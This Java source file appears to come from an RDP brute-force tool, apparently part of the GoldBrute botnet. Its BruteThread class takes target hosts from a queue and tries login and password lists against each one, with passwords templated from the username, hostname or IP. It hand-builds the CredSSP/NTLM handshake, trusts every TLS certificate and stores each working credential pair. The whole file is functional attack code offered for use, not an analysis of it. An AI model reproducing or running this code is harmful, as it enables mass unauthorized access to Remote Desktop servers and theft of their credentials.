package rdp.gold.brute.pool;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.net.SocketFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;

import org.apache.log4j.Logger;

import com.alibaba.fastjson.JSON;
import com.chilkatsoft.CkBinData;
import com.chilkatsoft.CkByteData;
import com.chilkatsoft.CkSocket;
import com.chilkatsoft.CkString;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelOption;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import rdp.gold.brute.Config;
import rdp.gold.brute.CounterPool;
import rdp.gold.brute.RDPEntity;
import rdp.gold.brute.ResultStorage;
import rdp.gold.brute.netty.ProtocolInitializer;
import rdp.gold.brute.rdp.ByteBuffer;
import rdp.gold.brute.rdp.Messages.ClientNtlmsspNegotiate;
import rdp.gold.brute.rdp.Messages.ClientNtlmsspPubKeyAuth;
import rdp.gold.brute.rdp.Messages.ClientTpkt;
import rdp.gold.brute.rdp.Messages.ClientX224ConnectionRequestPDU;
import rdp.gold.brute.rdp.Messages.NtlmState;
import rdp.gold.brute.rdp.Messages.ServerNtlmsspChallenge;
import rdp.gold.brute.rdp.Messages.ServerNtlmsspPubKeyPlus1;
import rdp.gold.brute.rdp.Messages.ServerTpkt;
import rdp.gold.brute.rdp.Messages.ServerX224ConnectionConfirmPDU;
import rdp.gold.brute.rdp.ssl.SSLState;
import rdp.gold.brute.rdp.ssl.SSLUtils;
import rdp.gold.brute.rdp.ssl.SecureSSLSocketFactory;
import rdp.gold.brute.rdp.ssl.TrustAllX509TrustManager;

@SuppressWarnings({ "unchecked", "rawtypes" })
public class BruteThread implements Runnable {
    private static final Logger logger = Logger.getLogger(BruteThread.class);
    private HashMap<String, String> loginsDomain = new HashMap();
    private ArrayList<String> logins = new ArrayList();
    @SuppressWarnings("unused")
    private String ip;
    @SuppressWarnings("unused")
    private int port;
    private String domain = "";
    private UUID bruteId = Config.PROJECT_ID;
    private String domainCk = null;
    private String domainJre = null;
    private String domainConscrypt = null;
    private String domainApr = null;
    private String domainBco = null;
    private String domainNetty = null;
    private static NioEventLoopGroup workerGroup = new NioEventLoopGroup();
    public static long POOL_SOCKET = 0L;

    public void run() {
        try {
            String host = null;
            for (;;) {
                if ((!this.bruteId.equals(Config.PROJECT_ID)) || (!Config.IS_ENABLED_BRUTE.get())) {
                    return;
                }
                boolean isRun = false;

                this.loginsDomain.clear();
                this.logins.clear();

                this.domainCk = null;
                this.domainJre = null;
                this.domainConscrypt = null;
                this.domainApr = null;
                this.domainBco = null;
                this.domainNetty = null;
                try {
                    host = (String) GoldBrute.getTaskBruteQueue().poll();
                    if (host != null) {
                        if (host.contains(">>>")) {
                            String ip = host.split(":")[0];
                            int port = Integer.parseInt(host.split(":")[1].split(">>>")[0]);
                            String[] loginsStr = host.split(">>>")[1].split(";");
                            for (String login : loginsStr) {
                                String loginItem = login.contains("\\") ? login.split("\\\\")[1] : login;
                                String loginDomainItem = login.contains("\\") ? login.split("\\\\")[0] : "";
                                try {
                                    isRun = true;
                                    CounterPool.poolUsed.incrementAndGet();

                                    boolean isValid = false;

                                    int cntPasswords = Config.PASSWORDS.size();
                                    for (int c = 0; c < cntPasswords; c++) {
                                        if ((!this.bruteId.equals(Config.PROJECT_ID)) || (!Config.IS_ENABLED_BRUTE.get())) {
                                            return;
                                        }
                                        String password = buildPassword(ip, loginItem, (String) Config.PASSWORDS.get(c));
                                        if (hasAccess(ip, port, loginDomainItem, loginItem, password)) {
                                            ResultStorage.saveSuccess(ip + ":" + port, login, password);

                                            logger.info("RDP on host " + ip + ":" + port + " with login " + loginItem + " and password " + password + " is allow access");
                                            CounterPool.countValid.incrementAndGet();
                                            isValid = true;
                                        }
                                        CounterPool.countCheckedCombinations.incrementAndGet();
                                        if (!isValid) {
                                            logger.info("RDP on host " + ip + ":" + port + " with login " + loginItem + " and password " + password + " is not allow access");
                                        }
                                    }
                                } finally {
                                    if (isRun == true) {
                                        CounterPool.poolUsed.decrementAndGet();
                                    }
                                }
                            }
                        } else {
                            RDPEntity rdpEntity = RDPEntity.parse(host);
                            logger.info("RDPEntity >>> " + JSON.toJSONString(rdpEntity));
                            boolean isValid = false;
                            String[] isValidConscrypt;
                            int isValidApr;
                            if (Config.BRUTE_MODE_CHECK_SINGLE_LOGIN_PASSWORD.booleanValue()) {
                                if ((rdpEntity != null) && (rdpEntity.getLogin() != null) && (rdpEntity.getPassword() != null)) {
                                    try {
                                        isRun = true;
                                        CounterPool.poolUsed.incrementAndGet();

                                        String ip = rdpEntity.getIp();
                                        int port = rdpEntity.getPort();
                                        String login = rdpEntity.getLogin();
                                        String password = buildPassword(ip, login, rdpEntity.getPassword());

                                        isValidConscrypt = new String[] {};
                                        isValidApr = 0;
                                        boolean isValidNetty = false;
                                        if (hasAccessNetty(ip, port, "", login, password)) {
                                            isValidNetty = true;
                                        }
                                        String domain = null;
                                        if (this.domainCk != null) {
                                            domain = this.domainCk;
                                        } else if (this.domainJre != null) {
                                            domain = this.domainJre;
                                        } else if (this.domainConscrypt != null) {
                                            domain = this.domainConscrypt;
                                        } else if (this.domainApr != null) {
                                            domain = this.domainApr;
                                        } else if (this.domainBco != null) {
                                            domain = this.domainBco;
                                        } else if (this.domainNetty != null) {
                                            domain = this.domainNetty;
                                        }
                                        if (isValidNetty) {
                                            if (domain != null) {
                                                login = domain + "\\" + login;
                                            }
                                            ResultStorage.saveSuccess(ip + ":" + port, login, password);

                                            logger.info("RDP on host " + ip + ":" + port + " with login " + login + " and password " + password + " is allow access");
                                            CounterPool.countValid.incrementAndGet();

                                            isValid = true;
                                        }
                                        CounterPool.countCheckedCombinations.incrementAndGet();
                                        if (!isValid) {
                                            logger.info("RDP on host " + ip + ":" + port + " with login " + login + " and password " + password + " is not allow access");
                                        }
                                    } finally {
                                        if (isRun == true) {
                                            CounterPool.poolUsed.decrementAndGet();
                                        }
                                    }
                                }
                            } else {
                                try {
                                    isRun = true;
                                    CounterPool.poolUsed.incrementAndGet();
                                    int cntLogins = this.logins.size() > 0 ? this.logins.size() : Config.LOGINS.size();

                                    String ip = rdpEntity.getIp();
                                    int port = rdpEntity.getPort();
                                    if (ScanThread.hasBrutable(ip, port)) {
                                        for (int i = 0; i < cntLogins; i++) {
                                            if (((isValid) && (!Config.BRUTE_IS_CHECK_ALL_COMBINATIONS.booleanValue())) || (!Config.IS_ENABLED_BRUTE.get())) {
                                                break;
                                            }
                                            String login = this.logins.size() > 0 ? (String) this.logins.get(i) : (String) Config.LOGINS.get(i);

                                            this.domain = (this.loginsDomain.containsKey(login) ? (String) this.loginsDomain.get(login) : "");

                                            ArrayList<String> passwords = new ArrayList();
                                            if (login.contains(":")) {
                                                try {
                                                    isValidConscrypt = login.split(":")[1].split(",");
                                                    isValidApr = isValidConscrypt.length;
                                                    for (int indx = 0; indx < isValidApr; indx++) {
                                                        String password = isValidConscrypt[indx];
                                                        passwords.add(password);
                                                    }
                                                    login = login.split(":")[0];
                                                } catch (Exception e) {
                                                    StringWriter sw = new StringWriter();
                                                    e.printStackTrace(new PrintWriter(sw));

                                                    logger.error(e + " " + sw);
                                                }
                                            }
                                            int cntPasswords = passwords.size() > 0 ? passwords.size() : Config.PASSWORDS.size();
                                            for (int c = 0; c < cntPasswords; c++) {
                                                if (((isValid) && (!Config.BRUTE_IS_CHECK_ALL_COMBINATIONS.booleanValue())) || (!Config.IS_ENABLED_BRUTE.get())) {
                                                    break;
                                                }
                                                String password = passwords.size() > 0 ? (String) passwords.get(c) : (String) Config.PASSWORDS.get(c);
                                                for (int j = 0; j < Config.BRUTE_CNT_ATTEMPTS.intValue(); j++) {
                                                    if (hasAccessNetty(ip, port, this.domain, login, password)) {
                                                        ResultStorage.saveSuccess(ip + ":" + port, login, password);

                                                        logger.info("RDP on host " + ip + ":" + port + " with login " + login + " and password " + password + " is allow access");
                                                        CounterPool.countValid.incrementAndGet();
                                                        isValid = true;

                                                        break;
                                                    }
                                                }
                                                CounterPool.countCheckedCombinations.incrementAndGet();
                                            }
                                        }
                                        if (!isValid) {
                                            logger.info("RDP on host " + ip + ":" + port + " is not allow access");
                                            CounterPool.countNotValidRdp.incrementAndGet();
                                        }
                                    } else {
                                        CounterPool.notSupportedRdp.incrementAndGet();
                                    }
                                    CounterPool.countCheckedIp.incrementAndGet();
                                } finally {
                                    if (isRun == true) {
                                        CounterPool.poolUsed.decrementAndGet();
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    StringWriter sw = new StringWriter();
                    e.printStackTrace(new PrintWriter(sw));
                    logger.error(e + " " + sw);
                }
                if (host == null) {
                    try {
                        Thread.sleep(200L);
                    } catch (InterruptedException localInterruptedException) {
                    }
                }
            }
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            logger.error(e + " " + sw);
        }
    }

    public boolean hasAccessCK(String host, int port, String domain, String login, String password) {
        Socket s = null;
        CkSocket socket = null;
        try {
            socket = new CkSocket();

            boolean ssl = false;

            int maxWaitMillisec = Config.BRUTE_TIMEOUT.intValue();
            boolean success = socket.Connect(host, port, ssl, maxWaitMillisec);
            socket.put_DebugLogFilePath("C:\\Users\\London\\Documents\\Sync\\debug.log");
            if (success != true) {
                throw new RuntimeException(socket.lastErrorText());
            }
            socket.put_MaxReadIdleMs(Config.BRUTE_TIMEOUT.intValue());
            socket.put_MaxSendIdleMs(Config.BRUTE_TIMEOUT.intValue());

            ClientTpkt clientTpkt = new ClientTpkt();
            ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU(login, 2);

            ByteBuffer buffer = clientX224ConnectionRequestPDU.proccessPacket(null);
            clientTpkt.proccessPacket(buffer);
            buffer.rewindCursor();

            CkByteData ckByteData = new CkByteData();
            ckByteData.appendByteArray(buffer.data);

            CkBinData ckBinData = new CkBinData();
            ckBinData.AppendBinary(ckByteData);
            if (!socket.SendBd(ckBinData, buffer.offset, buffer.length)) {
                throw new RuntimeException(socket.lastErrorText());
            }
            ckByteData = new CkByteData();
            if (!socket.ReceiveBytes(ckByteData)) {
                throw new RuntimeException(socket.lastErrorText());
            }
            buffer = new ByteBuffer(-1);
            buffer.data = ckByteData.toByteArray();
            buffer.length = ckByteData.getSize();
            buffer.rewindCursor();
            buffer.ref();

            CounterPool.useBytes.addAndGet(buffer.length);

            ServerTpkt serverTpkt = new ServerTpkt();
            buffer = serverTpkt.proccessPacket(buffer);

            ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
            serverX224ConnectionConfirmPDU.proccessPacket(buffer);
            if (!socket.ConvertToSsl()) {
                throw new RuntimeException(socket.lastErrorText());
            }
            CkString ckString = new CkString();
            socket.get_TlsCipherSuite(ckString);
            logger.info("Cipher: " + ckString.getString());

            ckString = new CkString();
            socket.get_TlsVersion(ckString);
            logger.info("TlsVersion: " + ckString.getString());

            ckString = new CkString();
            socket.get_SslProtocol(ckString);
            logger.info("SslProtocol: " + ckString.getString());

            ckString = new CkString();
            socket.get_StringCharset(ckString);
            logger.info("StringCharset: " + ckString.getString());

            ckString = new CkString();
            socket.get_TlsCipherSuite(ckString);
            logger.info("TlsCipherSuite: " + ckString.getString());

            logger.info("SoRcvBuf: " + socket.get_SoRcvBuf());
            logger.info("SoSndBuf: " + socket.get_SoSndBuf());

            CkByteData outData = new CkByteData();
            socket.GetSslServerCert().ExportPublicKey().GetDer(false, outData);

            SSLState sslState = new SSLState();
            sslState.serverCertificateSubjectPublicKeyInfo = outData.toByteArray();

            NtlmState ntlmState = new NtlmState();
            ClientNtlmsspNegotiate clientNtlmsspNegotiate = new ClientNtlmsspNegotiate(ntlmState);
            buffer = clientNtlmsspNegotiate.proccessPacket(null);
            buffer.rewindCursor();

            ckByteData = new CkByteData();
            ckByteData.appendByteArray(buffer.data);

            ckBinData = new CkBinData();
            ckBinData.AppendBinary(ckByteData);
            if (!socket.SendBd(ckBinData, buffer.offset, buffer.length)) {
                throw new RuntimeException(socket.lastErrorText());
            }
            ckByteData = new CkByteData();
            if (!socket.ReceiveBytes(ckByteData)) {
                throw new RuntimeException(socket.lastErrorText());
            }
            buffer = new ByteBuffer(-1);
            buffer.data = ckByteData.toByteArray();
            buffer.length = ckByteData.getSize();
            buffer.rewindCursor();
            buffer.ref();

            CounterPool.useBytes.addAndGet(buffer.length);

            ServerNtlmsspChallenge serverNtlmsspChallenge = new ServerNtlmsspChallenge(ntlmState);
            serverNtlmsspChallenge.proccessPacket(buffer);

            this.domainCk = ntlmState.serverNetbiosDomainName;

            ClientNtlmsspPubKeyAuth clientNtlmsspPubKeyAuth = new ClientNtlmsspPubKeyAuth(ntlmState, sslState, host, "", "workstation", login, password);

            buffer = clientNtlmsspPubKeyAuth.proccessPacket(null);
            buffer.rewindCursor();

            ckByteData = new CkByteData();
            ckByteData.appendByteArray(buffer.data);

            ckBinData = new CkBinData();
            ckBinData.AppendBinary(ckByteData);
            if (!socket.SendBd(ckBinData, buffer.offset, buffer.length)) {
                throw new RuntimeException(socket.lastErrorText());
            }
            ckByteData = new CkByteData();
            if (!socket.ReceiveBytes(ckByteData)) {
                throw new RuntimeException(socket.lastErrorText());
            }
            buffer = new ByteBuffer(-1);
            buffer.data = ckByteData.toByteArray();
            buffer.length = ckByteData.getSize();
            buffer.rewindCursor();
            buffer.ref();

            CounterPool.useBytes.addAndGet(buffer.length);

            ServerNtlmsspPubKeyPlus1 serverNtlmsspPubKeyPlus1 = new ServerNtlmsspPubKeyPlus1(ntlmState);
            serverNtlmsspPubKeyPlus1.proccessPacket(buffer);

            return true;
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));

            logger.error(e + " " + sw);
        } finally {
            try {
                if ((s != null) && (!s.isClosed())) {
                    s.close();
                }
            } catch (Exception exception) {
                logger.error(exception);
            }
            try {
                if ((socket != null) && (socket.get_IsConnected())) {
                    socket.Close(1000);
                }
            } catch (Exception exception) {
                logger.error(exception);
            }
        }
        return false;
    }

    public boolean hasAccessNetty(String host, int port, String domain, String login, String password) {
        AtomicBoolean isValid = new AtomicBoolean(false);
        StringBuilder getDomain = new StringBuilder();
        try {
            Bootstrap b = new Bootstrap();
            b.group(workerGroup);
            b.channel(NioSocketChannel.class);
            b.option(ChannelOption.SO_KEEPALIVE, Boolean.valueOf(false));
            b.option(ChannelOption.TCP_NODELAY, Boolean.valueOf(true));
            b.option(ChannelOption.CONNECT_TIMEOUT_MILLIS, Config.BRUTE_TIMEOUT);

            b.handler(new ProtocolInitializer(host, port, domain, login, password, isValid, getDomain));
            ChannelFuture channelFuture = b.connect(host, port).sync();

            channelFuture.channel().closeFuture().sync();
        } catch (Exception e) {
            logger.info(e);
        } finally {
            this.domainNetty = getDomain.toString();
        }
        return isValid.get();
    }

    public boolean isCredSsp(String host, int port) {
        Socket socket = null;
        try {
            InetSocketAddress address = new InetSocketAddress(host, port);

            long startTime = System.currentTimeMillis();

            socket = SocketFactory.getDefault().createSocket();
            socket.connect(address, Config.BRUTE_TIMEOUT.intValue());
            socket.setSoTimeout(Config.BRUTE_TIMEOUT.intValue());

            InputStream inputStream = socket.getInputStream();
            OutputStream outputStream = socket.getOutputStream();

            ClientTpkt clientTpkt = new ClientTpkt();
            ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU("Admin", 2);

            ByteBuffer buffer = clientX224ConnectionRequestPDU.proccessPacket(null);
            clientTpkt.proccessPacket(buffer);
            buffer.rewindCursor();

            outputStream.write(buffer.data, buffer.offset, buffer.length);
            outputStream.flush();

            buffer = new ByteBuffer(-1);
            int actualLength = inputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
            if (actualLength <= 0) {
                throw new Exception("INFO: End of stream or empty buffer is read from stream.");
            }
            buffer.length = actualLength;
            buffer.rewindCursor();
            buffer.ref();

            ServerTpkt serverTpkt = new ServerTpkt();
            buffer = serverTpkt.proccessPacket(buffer);

            ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
            serverX224ConnectionConfirmPDU.proccessPacket(buffer);

            SSLState sslState = new SSLState();

            SSLContext sslContext = SSLUtils.getSSLContext();
            sslContext.init(null, new TrustManager[] { new TrustAllX509TrustManager(sslState) }, null);

            long elapsedTime = System.currentTimeMillis() - startTime;

            SSLSocketFactory sslSocketFactory = new SecureSSLSocketFactory(sslContext);

            SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket(socket, address.getHostName(), address.getPort(), true);
            sslSocket.setEnabledProtocols(SSLUtils.getSupportedProtocols(sslSocket.getEnabledProtocols()));

            sslSocket.setSoTimeout(new Long(Config.BRUTE_TIMEOUT.intValue() - elapsedTime).intValue());
            sslSocket.startHandshake();

            InputStream sslSocketInputStream = sslSocket.getInputStream();
            OutputStream sslSocketOutputStream = sslSocket.getOutputStream();

            NtlmState ntlmState = new NtlmState();
            ClientNtlmsspNegotiate clientNtlmsspNegotiate = new ClientNtlmsspNegotiate(ntlmState);
            buffer = clientNtlmsspNegotiate.proccessPacket(null);
            buffer.rewindCursor();

            sslSocketOutputStream.write(buffer.data, buffer.offset, buffer.length);
            sslSocketOutputStream.flush();

            buffer = new ByteBuffer(-1);

            actualLength = sslSocketInputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
            if (actualLength <= 0) {
                throw new Exception("INFO: End of stream or empty buffer is read from stream.");
            }
            buffer.length = actualLength;
            buffer.rewindCursor();
            buffer.ref();

            ServerNtlmsspChallenge serverNtlmsspChallenge = new ServerNtlmsspChallenge(ntlmState);
            serverNtlmsspChallenge.proccessPacket(buffer);

            return true;
        } catch (Exception e) {
            logger.error("Host-> " + host + " Port-> " + port + e.getMessage());
        } finally {
            try {
                socket.close();
            } catch (Exception e) {
                logger.error(e);
            }
        }
        return false;
    }

    public boolean hasAccess(String host, int port, String domain, String login, String password) {
        Socket socket = null;
        try {
            InetSocketAddress address = new InetSocketAddress(host, port);

            long startTime = System.currentTimeMillis();

            socket = SocketFactory.getDefault().createSocket();
            socket.connect(address, Config.BRUTE_TIMEOUT.intValue());
            socket.setSoTimeout(Config.BRUTE_TIMEOUT.intValue());

            InputStream inputStream = socket.getInputStream();
            OutputStream outputStream = socket.getOutputStream();

            ClientTpkt clientTpkt = new ClientTpkt();
            ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU(login, 2);

            ByteBuffer buffer = clientX224ConnectionRequestPDU.proccessPacket(null);
            clientTpkt.proccessPacket(buffer);
            buffer.rewindCursor();

            outputStream.write(buffer.data, buffer.offset, buffer.length);
            outputStream.flush();

            buffer = new ByteBuffer(-1);
            int actualLength = inputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
            if (actualLength <= 0) {
                throw new Exception("INFO: End of stream or empty buffer is read from stream.");
            }
            buffer.length = actualLength;
            buffer.rewindCursor();
            buffer.ref();

            CounterPool.useBytes.addAndGet(actualLength);

            ServerTpkt serverTpkt = new ServerTpkt();
            buffer = serverTpkt.proccessPacket(buffer);

            ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
            serverX224ConnectionConfirmPDU.proccessPacket(buffer);

            SSLState sslState = new SSLState();

            SSLContext sslContext = SSLUtils.getSSLContext();
            sslContext.init(null, new TrustManager[] { new TrustAllX509TrustManager(sslState) }, null);

            long elapsedTime = System.currentTimeMillis() - startTime;

            SSLSocketFactory sslSocketFactory = new SecureSSLSocketFactory(sslContext);

            SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket(socket, address.getHostName(), address.getPort(), true);
            sslSocket.setEnabledProtocols(SSLUtils.getSupportedProtocols(sslSocket.getEnabledProtocols()));

            sslSocket.setSoTimeout(new Long(Config.BRUTE_TIMEOUT.intValue() - elapsedTime).intValue());
            sslSocket.startHandshake();

            logger.info("TLS: " + sslSocket.getSession());
            logger.info("TLS protocol: " + sslSocket.getSession().getProtocol());

            logger.info("getSessionCacheSize: " + sslSocket.getSession().getSessionContext().getSessionCacheSize());
            logger.info("getSessionTimeout: " + sslSocket.getSession().getSessionContext().getSessionTimeout());

            sslSocket.setReceiveBufferSize(4194304);
            sslSocket.setSendBufferSize(262144);

            logger.info("ReceiveBufferSize: " + sslSocket.getReceiveBufferSize());
            logger.info("SendBufferSize: " + sslSocket.getSendBufferSize());

            InputStream sslSocketInputStream = sslSocket.getInputStream();
            OutputStream sslSocketOutputStream = sslSocket.getOutputStream();

            NtlmState ntlmState = new NtlmState();
            ClientNtlmsspNegotiate clientNtlmsspNegotiate = new ClientNtlmsspNegotiate(ntlmState);
            buffer = clientNtlmsspNegotiate.proccessPacket(null);
            buffer.rewindCursor();

            sslSocketOutputStream.write(buffer.data, buffer.offset, buffer.length);
            sslSocketOutputStream.flush();

            buffer = new ByteBuffer(-1);

            actualLength = sslSocketInputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
            if (actualLength <= 0) {
                throw new Exception("INFO: End of stream or empty buffer is read from stream.");
            }
            buffer.length = actualLength;
            buffer.rewindCursor();
            buffer.ref();

            CounterPool.useBytes.addAndGet(actualLength);

            ServerNtlmsspChallenge serverNtlmsspChallenge = new ServerNtlmsspChallenge(ntlmState);
            serverNtlmsspChallenge.proccessPacket(buffer);

            this.domainJre = ntlmState.serverNetbiosDomainName;

            ClientNtlmsspPubKeyAuth clientNtlmsspPubKeyAuth = new ClientNtlmsspPubKeyAuth(ntlmState, sslState, host, "", "workstation", login, password);

            buffer = clientNtlmsspPubKeyAuth.proccessPacket(null);
            buffer.rewindCursor();

            sslSocketOutputStream.write(buffer.data, buffer.offset, buffer.length);
            sslSocketOutputStream.flush();

            buffer = new ByteBuffer(-1);
            actualLength = sslSocketInputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
            if (actualLength <= 0) {
                throw new Exception("INFO: End of stream or empty buffer is read from stream.");
            }
            buffer.length = actualLength;
            buffer.rewindCursor();
            buffer.ref();

            CounterPool.useBytes.addAndGet(actualLength);

            ServerNtlmsspPubKeyPlus1 serverNtlmsspPubKeyPlus1 = new ServerNtlmsspPubKeyPlus1(ntlmState);
            serverNtlmsspPubKeyPlus1.proccessPacket(buffer);

            return true;
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            logger.error(e.getMessage() + sw.toString());
        } finally {
            try {
                socket.close();
            } catch (Exception e) {
                logger.error(e);
            }
        }
        return false;
    }

    @SuppressWarnings("unused")
    private void parseHost(String host) throws Exception {
        try {
            RDPEntity rdpEntity = RDPEntity.parse(host);
            if ((rdpEntity != null) && (rdpEntity.getLogin() != null) && (rdpEntity.getPassword() != null)) {
                this.ip = rdpEntity.getIp();
                this.port = rdpEntity.getPort();
            } else {
                this.ip = host.split(":")[0];
                if (host.contains(">>>")) {
                    this.port = Integer.parseInt(host.split(":")[1].split(">>>")[0]);

                    String[] loginsStr = host.split(">>>")[1].split(";");
                    for (String login : loginsStr) {
                        try {
                            this.loginsDomain.put(login.contains("\\") ? login.split("\\\\")[1] : login, login.contains("\\") ? login.split("\\\\")[0] : "");
                            this.logins.add(login.contains("\\") ? login.split("\\\\")[1] : login);
                        } catch (Exception localException1) {
                        }
                    }
                } else {
                    this.port = Integer.parseInt(host.split(":")[1]);
                }
            }
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            logger.error(e.getMessage() + sw.toString());

            throw e;
        }
    }

    private String buildPassword(String ip, String login, String password) {
        if (password.equals("%EmptyPass%")) {
            password = "";
        } else if (password.equals("%OriginalUsername%")) {
            password = password.replace("%OriginalUsername%", login);
        } else if (password.equals("%username%")) {
            password = password.replace("%username%", login.toLowerCase());
        } else if (password.equals("%GetHost%")) {
            try {
                InetAddress inetAddress = InetAddress.getByName(ip);
                password = inetAddress.getHostName();
            } catch (Exception localException) {
            }
        } else if (password.equals("%IP%")) {
            password = ip;
        } else if (password.equals("%IpReplaceDot%")) {
            password = ip.replaceAll("\\.", "");
        }
        return password;
    }

    public static void main(String[] argc) throws Exception {
        try {
            Runtime rt = Runtime.getRuntime();
            String cmd = "cmd /c WMIC /node: /user:\"\" /password:\"\" OS get name";

            Process pr = rt.exec(cmd);

            BufferedReader input = new BufferedReader(new InputStreamReader(pr.getInputStream()));
            BufferedReader error = new BufferedReader(new InputStreamReader(pr.getErrorStream()));

            String line = null;
            while ((line = input.readLine()) != null) {
                System.out.println(line);
            }
            while ((line = error.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception e) {
            System.out.println(e.toString());
            e.printStackTrace();
        }
        System.out.println("End");
    }
}
